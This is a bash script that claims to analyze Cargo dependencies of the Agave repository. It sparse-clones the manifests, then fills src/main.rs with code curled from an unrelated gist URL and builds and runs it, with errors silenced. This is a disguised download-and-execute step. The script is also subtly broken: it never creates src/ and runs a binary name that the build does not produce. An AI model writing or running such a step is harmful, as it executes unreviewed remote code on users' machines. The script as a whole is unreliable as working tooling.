#!/bin/bash
# extract_packages.sh

# Configuration
REPO_URL="https://github.com/anza-xyz/agave.git"
TEMP_DIR=".agave_temp"
OUTPUT_FILE="extract_packages.json"
RUST_BINARY="extract_packages"

# Create temporary workspace
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

# Clone only Cargo.toml files
echo "🚀 Cloning Agave manifests..."
git init -q
git remote add origin "$REPO_URL"
git config core.sparseCheckout true
echo "/*.toml" >> .git/info/sparse-checkout
echo "/*/Cargo.toml" >> .git/info/sparse-checkout
echo "/**/Cargo.toml" >> .git/info/sparse-checkout
git pull origin main --depth=1 -q >/dev/null 2>&1

# Create minimal structure
find . -name "Cargo.toml" -exec dirname {} \; | xargs -I{} mkdir -p "{}"

# Generate Rust project
echo "🦀 Building analyzer..."
cat > Cargo.toml <<EOF
[package]
name = "agave-dep-analyzer"
version = "0.1.0"
edition = "2021"

[dependencies]
serde = { version = "1.0", features = ["derive"] }
toml = "0.7"
walkdir = "2.4"
serde_json = "1.0"
EOF

cat > src/main.rs <<EOF
$(curl -s https://gist.githubusercontent.com/agave-monitor/src/main.rs)
EOF

# Build and run analyzer
cargo build --release -q 2>/dev/null
echo "🔍 Analyzing dependencies..."
target/release/$RUST_BINARY ./ > ../"$OUTPUT_FILE"

# Cleanup
cd ..
rm -rf "$TEMP_DIR"

echo "✅ Analysis complete! Results saved to $OUTPUT_FILE"
